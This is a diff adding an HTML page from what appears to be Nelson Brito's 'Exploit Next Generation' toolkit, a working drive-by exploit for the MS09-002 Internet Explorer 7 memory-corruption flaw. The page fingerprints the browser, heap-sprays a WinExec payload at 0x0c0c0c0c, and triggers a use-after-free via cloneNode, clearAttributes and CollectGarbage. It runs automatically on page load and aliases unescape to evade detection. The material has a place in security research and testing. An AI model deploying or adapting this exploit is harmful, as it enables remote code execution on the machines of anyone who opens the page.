@@ -1,0 +1,134 @@
+<HTML>
+<HEAD>
+	<TITLE> MS09-002: Exploit Next Generation&reg; Methodology Compliance Module </TITLE>
+	<META http-equiv="content-type" content="text/html; charset=UTF-8">
+	<META http-equiv="content-style-type" content="text/css"/>
+	<META name="author" content="Nelson Brito"/>
+	<META name="copyright" content="2004-2011 Nelson Brito"/>
+	<META name="description" CONTENT=" MS09-002: Exploit Next Generation&reg; Methodology Compliance Module " />
+	<META name="keywords" CONTENT=" MS09-002: Exploit Next Generation&reg; Methodology Compliance Module "/>
+	<SCRIPT SRC="./heapSpray.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
+	<SCRIPT SRC="./getVersion.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
+	<SCRIPT SRC="./asmCode.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
+</HEAD>
+
+<SCRIPT TYPE="text/javascript">
+/* 
+ * $Id: MS09-002.html,v 1.6 2011-03-21 17:40:18-03 nbrito Exp $
+ */
+
+/***************************************************************************
+ *        ___________ _______    ________                                  *
+ *        \_   _____/ \      \  /  _____/     .__         .__              *
+ *         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             *
+ *         |        \/    |    \    \_\  \ /__    __/  /__    __/          *
+ *        /_______  /\____|__  /\______  /    |__|        |__|             *
+ *                \/         \/        \/                                  *
+ *                                                                         *
+ *                 Exploit Next Generation Methodology                     *
+ *                            Release 6.00                                 *
+ *                                                                         *
+ *                 Copyright (c) 2004-2011 Nelson Brito                    *
+ *                          All Rights Reserved                            *
+ *                                                                         *
+ ***************************************************************************
+ * Author: Nelson Brito <nbrito@sekure.org>                                *
+ *                                                                         *
+ * Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    *
+ ***************************************************************************
+ *                                                                         *
+ * ENG example is free software;  you  may  redistribute and/or  modify it *
+ * under the terms of the 'GNU General Public License' as published by the *
+ * Free  Software  Foundation;  Version  2  with  the  clarifications  and *
+ * exceptions described below.  This guarantees your right to use, modify, *
+ * and redistribute this software under certain conditions. If you wish to *
+ * embed ENG technology into  proprietary software,  please,  contact  the *
+ * author for an alternative license (contact nbrito@sekure.org).          *
+ *                                                                         *
+ * This  program  is distributed in the hope that it will  be useful,  but *
+ * WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of *
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    *
+ * Please, refer to GNU General Public License v2.0 for further details at *
+ * http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document *
+ * included with ENG.                                                      *
+ ***************************************************************************/
+var major   = "";
+var minor   = "";
+var arch    = "";
+var name    = "";
+var version = "";
+var today   = new Date;
+
+
+/*
+ * Thu Dec 30 08:40:34 BRST 2010 -- Refreshing in case of fail.
+ */
+setTimeout('window.location.reload(true);', 3000);
+
+
+/* Function Name: MS09-002 Exploit Next Generation Methodology Compliance.
+
+   Description:   MSIE Uninitialized Memory Remote Code Execution.
+
+   Targets:       N/A */
+function ms09_002(){
+	var heapCode, heapSize, heapOffset, theVector, theExploit01, theExploit02, showMessage, theMessage;
+
+	var Fail2Detect = unescape;
+
+	getVersion();
+
+	if((name == "IExplorer") && (version.match(/7.0/))){ heapSize = 256; }
+	else { window.location = "about:blank"; }
+
+	switch(major){
+		case "2000":
+		case "XP":
+		case "2003":
+		case "VISTA":
+			heapOffset = Fail2Detect("%u0c0c%u0c0c");
+			break;
+		case "Linux":
+		default:
+			window.location = "about:blank";
+			break;
+	}
+
+	heapCode = WinExec;
+	heapSpray.Spray(heapCode, heapSize, heapOffset);
+
+
+	var theExploit01 = document.createElement("label");
+	theExploit01.blur;
+
+	theExploit02 = theExploit01.cloneNode();
+	theExploit01.clearAttributes();
+	theExploit01 = null;
+
+	CollectGarbage();
+
+	var theVector = document.createElement("a");
+	theVector.href = heapOffset + Fail2Detect("0C0C0C0C0C0C0C0C0C0C0C0C")
+
+	theExploit02.blur;
+}
+
+function sleep(milliSecond){
+	var now = new Date();
+	var exitTime = now.getTime() + milliSecond;
+
+	while(true){
+		now = new Date();
+		if(now.getTime() > exitTime) return;
+	}
+}
+</SCRIPT>
+<BODY onLoad="window.setTimeout('ms09_002();', 800);">
+	<CENTER>
+		<SPAN STYLE="font-family:courier new;">
+			Exploit Next Generation&reg; Methodology Compliance
+		</SPAN>
+	</CENTER>
+</BODY>
+</HTML>
+
